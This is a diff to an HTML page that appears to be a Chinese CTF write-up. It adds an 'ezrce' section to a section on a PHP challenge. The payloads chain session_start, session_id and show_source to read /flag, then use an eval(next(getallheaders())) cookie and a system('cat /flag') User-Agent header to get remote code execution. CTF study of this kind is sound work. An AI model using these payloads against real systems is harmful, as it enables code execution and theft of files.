@@ -124,6 +124,14 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;//POST</span><br><span class="line">&gt;show_source(session_id(session_start()))</span><br><span class="line"></span><br><span class="line">&gt;//Cookie</span><br><span class="line">&gt;PHPSESSID=/flag</span><br></pre></td></tr></table></figure></blockquote>
 </li>
 </ol>
+<h3 id="ezrce（RCE）"><a href="#ezrce（RCE）" class="headerlink" title="ezrce（RCE）"></a>ezrce（RCE）</h3><ol>
+<li><p>前面步骤基本相同</p>
+</li>
+<li><p>传参稍微不同，但是可以RCE</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;//POST</span><br><span class="line">&gt;show_source(session_id(session_start()))</span><br><span class="line"></span><br><span class="line">&gt;//Cookie</span><br><span class="line">&gt;PHPSESSID=eval(next(getallheaders()))</span><br><span class="line"></span><br><span class="line">&gt;//UA</span><br><span class="line">&gt;system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure></blockquote>
+</li>
+</ol>
 
       
     </div>
